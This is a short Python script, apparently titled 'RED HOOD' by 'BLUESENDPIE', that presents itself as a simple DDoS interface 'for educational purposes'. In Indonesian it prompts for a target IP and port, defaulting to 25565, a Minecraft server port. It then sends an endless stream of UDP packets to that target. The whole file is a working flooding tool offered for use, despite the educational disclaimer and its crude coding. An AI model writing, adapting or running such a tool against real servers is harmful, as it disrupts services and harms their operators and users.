import colorama

from colorama import Fore

title = '''
==============================================================
  _____   ______  _____      _    _   ____    ____   _____  
 |  __ \ |  ____||  __ \    | |  | | / __ \  / __ \ |  __ \ 
 | |__) || |__   | |  | |   | |__| || |  | || |  | || |  | |
 |  _  / |  __|  | |  | |   |  __  || |  | || |  | || |  | |
 | | \ \ | |____ | |__| |   | |  | || |__| || |__| || |__| |
 |_|  \_\|______||_____/    |_|  |_| \____/  \____/ |_____/ 
==============================================================
                    ||BLUESENDPIE||                                                       
||SIMPLE DDOS INTERFACE MADE BY BLUESENDPIE FOR EDUCATIONAL PURPOSES||                                    
'''
print(Fore.RED + title)

import socket

print("Script DDOS simple untuk pendidikan, jangan disalahgunakan!")
print("Masukan port 0 kalau mau default")
ip = input('Masukan IP = ')
port = int(input('Masukan Port (Default: 25565) = '))

if port == 0:
      port = 25565

while True:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((ip, port))
   i = 0
   if i < 10:
      s.send(b'\x01')
